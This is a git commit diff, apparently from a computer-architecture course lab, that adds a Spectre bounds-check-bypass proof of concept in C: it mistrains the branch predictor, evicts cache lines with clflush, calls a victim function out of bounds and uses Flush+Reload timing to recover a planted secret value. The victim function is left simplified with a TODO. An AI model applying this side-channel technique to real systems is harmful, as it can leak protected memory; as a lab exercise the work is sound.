c24ea73946093e8dd63a94b5364186f1d6ad79a6
Anish Govind <anishg24@gmail.com>
2024-10-31 16:41:12 -0700

    Added spectre attack

--- main.c
+++ main.c
@@ -7,18 +7,26 @@
 #define SENSITIVITY 40
 #define LINE_SIZE 64
 #define SECRET_SIZE 100
-#define BOUND 20
+#define BOUND_OFFSET 10
+
+#ifndef BOUND
+#define BOUND 40
+#endif /* ifndef BOUND */
 
 //** Write your victim function here */
 // Assume secret_array[47] is your secret value
 // Assume the bounds check bypass prevents you from loading values above 20
 // Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
 
-// void victim_function(int idx) {
-//   int tmp;
-//   if (idx < BOUND)
-//     tmp = dummy_array[secret_array[idx*LINE_SIZE] * LINE_SIZE];
-// }
+int *secret_array;
+int *dummy_array;
+
+void victim_function(int idx, int bound) {
+  if (idx < bound) {
+    // TODO: Use secret_array to get addr into dummy_array
+    secret_array[idx * LINE_SIZE] = 1;
+  }
+}
 
 int main(int argc, char **argv)
 {
@@ -39,43 +47,47 @@ int main(int argc, char **argv)
 
 
     //** STEP 1: Allocate an array into the mmap */
-    int *secret_array = (int *)huge_page;
-    int *dummy_array = (int *)huge_page;
+    secret_array = (int *)huge_page;
+    dummy_array = (int *)huge_page;
+
+
+    volatile int bound = BOUND;
+    clflush((void *)&bound);
 
     // Initialize the array
-    for (int i = 0; i < SECRET_SIZE*LINE_SIZE; i += LINE_SIZE) {
-      secret_array[i] = i/LINE_SIZE;
+    for (int i = 0; i < SECRET_SIZE; i++) {
+      secret_array[i*LINE_SIZE] = i;
     }
+    secret_array[(BOUND+BOUND_OFFSET)*LINE_SIZE] = 90; // Suppose the secret value we want is 90.
 
     //** STEP 2: Mistrain the branch predictor by calling victim function here */
     // To prevent any kind of patterns, ensure each time you train it a different number of times
 
-    // for (int i = 0; i < BOUND; i++) {
-    //   victim_function(i); 
-    // } 
-    //
-    // lfence();
-    //
-    // //** STEP 3: Clear cache using clflush from utility.h */
-    // for (int a = 0; a < SECRET_SIZE*LINE_SIZE; a += LINE_SIZE) {
-    //   clflush(&secret_array[a]);
-    // }
+    for (int i = 0; i < BOUND; i++) {
+      victim_function(i, bound); 
+    } 
+
+    //** STEP 3: Clear cache using clflush from utility.h */
+    for (int a = 0; a < SECRET_SIZE; a++) {
+      clflush(secret_array + (a*LINE_SIZE));
+    }
 
     //** STEP 4: Call victim function again with bounds bypass value */
-    int message = 47;
-    secret_array[message * LINE_SIZE] = 1;
-    // victim_function(message);
-    // clflush(&message);
+    int message = BOUND + BOUND_OFFSET;
+    // secret_array[message * LINE_SIZE] = 1;
+    clflush((void *)&bound);
+    victim_function(message, bound);
 
     //** STEP 5: Reload mmap to see load times */
     // Just read the mmap's first 100 integers
     for (int j = 0; j < SECRET_SIZE; j++) {
-      if (measure_one_block_access_time((uint64_t)(secret_array + (j*LINE_SIZE))) < SENSITIVITY) {
-        printf("Line is %d.\n", j);
+      int cycles = measure_one_block_access_time((uint64_t)(secret_array + (j*LINE_SIZE)));
+      if (cycles < SENSITIVITY) {
+        printf("Secret Value is: %d.\n", j);
       }
     }
 
-    printf("Done.\n");
+    printf("Done reloading.\n(Bound: %d, Expected for testing: %d)\n", BOUND, BOUND + BOUND_OFFSET);
 
     return 0;
 }
